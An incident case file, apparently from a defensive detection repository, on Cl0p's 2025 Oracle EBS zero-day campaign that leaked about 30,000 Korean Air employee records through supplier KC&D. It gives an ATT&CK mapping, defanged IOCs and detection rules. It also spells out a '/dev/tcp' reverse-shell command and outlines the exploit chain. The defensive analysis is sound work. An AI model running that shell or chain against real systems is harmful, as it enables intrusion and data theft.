# 11. Korean Air employee data via catering supplier KC&D (대한항공 협력사 KC&D, Oracle EBS / Cl0p), 2025

Cl0p's mass exploitation of an Oracle E-Business Suite zero-day reached a former subsidiary that still held the airline's employee data. About 30,000 employee records, including bank account numbers, were published on Cl0p's leak site.

| Field | Value |
| --- | --- |
| Dates | Leak-site listing 21 November 2025. Airline disclosure 29 December 2025 |
| Sector | Aviation supply chain (항공·협력사) |
| Impact | About 30,000 current and former employees: names, phone numbers, bank account numbers. Nearly 500 GB of archives published. No customer data reported |
| Initial access | Oracle EBS, most likely CVE-2025-61882 (BI Publisher Integration / Concurrent Processing, unauthenticated RCE, CVSS 9.8). CVE-2025-61884 (Configurator) was exploited in the same campaign |
| Attribution | Cl0p (claimed on its leak site) |
| Public IOCs | Oracle's campaign IOCs (not specific to this victim) |

## Background: the 2025 Oracle EBS campaign

- From about August 2025 Cl0p exploited EBS 12.2.3–12.2.14 at more than 100 organizations and sent extortion emails from late September.
- Oracle released a Security Alert for CVE-2025-61882 on 4 October 2025 and a second alert for CVE-2025-61884 on 11 October.
- The exploit chain abuses `/OA_HTML/SyncServlet` and the configurator `UiServlet`, and loads a malicious XSL template through the XDO `TemplatePreviewPG` page, ending in a reverse shell.
- KC&D was spun off and sold in 2020 but still processed the airline's employee data, so the airline was exposed through a supplier.

## ATT&CK mapping

| Tactic | Technique | Observed as |
| --- | --- | --- |
| Initial Access | T1190 Exploit Public-Facing Application | CVE-2025-61882 / 61884 |
| Initial Access | T1199 Trusted Relationship | Data held by a former subsidiary |
| Execution | T1059.004 Unix Shell | `bash -i >& /dev/tcp/<ip>/<port>` reverse shell |
| Collection | T1005, T1213 | ERP data |
| Exfiltration | T1041 | Archives later published |
| Impact | T1657 Financial Theft (extortion) | Leak-site publication |

## IOCs (campaign-wide, from Oracle's Security Alert)

| Type | Value (defanged) | Note |
| --- | --- | --- |
| IPv4 | `200.107.207[.]26` | GET/POST activity against EBS |
| IPv4 | `185.181.60[.]11` | GET/POST activity against EBS |
| Command | `sh -c /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1` | Reverse shell |
| SHA256 | `76b6d36e04e367a2334c445b51e1ecce97e4c614e88dfb4f72b104ca0f31235d` | Exploit archive |
| SHA256 | `aa0d3859d6633b62bccfb69017d33a8979a3be1f3f0a5a4bf6960d6c73d41121` | `exp.py` |
| SHA256 | `6fd538e4a8e3493dda6f9fcdc96e814bdd14f3e2ef8aa46f0143bff34b882c1b` | `server.py` |

All six are also in [`../iocs/iocs.csv`](../iocs/iocs.csv).

## Detect it with this repo

| Layer | Detection |
| --- | --- |
| IDS | Suricata [9100061–62](../../../detections/suricata/blue-team.rules) (POST to UiServlet, SyncServlet), pcap-tested |
| WAF | [1009132](../../../detections/waf/modsecurity/blue-team-waf.conf) (SyncServlet, UiServlet), 1009133 (TemplatePreviewPG), live-tested |
| EDR (Linux) | Sigma [`linux_reverse_shell_dev_tcp`](../../../detections/sigma/linux_reverse_shell_dev_tcp.yml), [`webshell_child_process_linux`](../../../detections/sigma/webshell_child_process_linux.yml) (Java parent) |
| Hunting | Oracle EBS exploitation (to be added) |
| Vulnerabilities | [CVE-2025-61882 / 61884](../vulnerabilities.md) |

## Lessons for SOC and CERT

- **ERP should not face the internet** without an access gateway. Most victims had EBS reachable directly.
- **Supplier data is your data.** Inventory which suppliers and former subsidiaries still hold your employees' or customers' data, and require breach notice in contracts.
- **Mass-exploitation campaigns have a window of days.** Pre-build WAF virtual patches for your crown-jewel applications so they can be switched on the day an alert lands.
- **Reverse shells from application servers are rare and loud.** Alert on `/dev/tcp/` in any command line and on Java or web processes starting a shell.

## Sources

- [SecurityWeek: 30,000 employee records, leak-site listing on 21 November](https://www.securityweek.com/korean-air-data-compromised-in-oracle-ebs-hack/)
- [Kyunghyang: airline disclosure on 29 December](https://www.khan.co.kr/article/202512290920011)
- [Oracle Security Alert CVE-2025-61882](https://www.oracle.com/security-alerts/alert-cve-2025-61882.html)
- [BleepingComputer: Oracle IOCs match leaked exploit](https://www.bleepingcomputer.com/news/security/oracle-patches-ebs-zero-day-exploited-in-clop-data-theft-attacks/amp/)
- [Beazley Security Labs advisory BSL-A1136](https://labs.beazley.security/advisories/BSL-A1136)
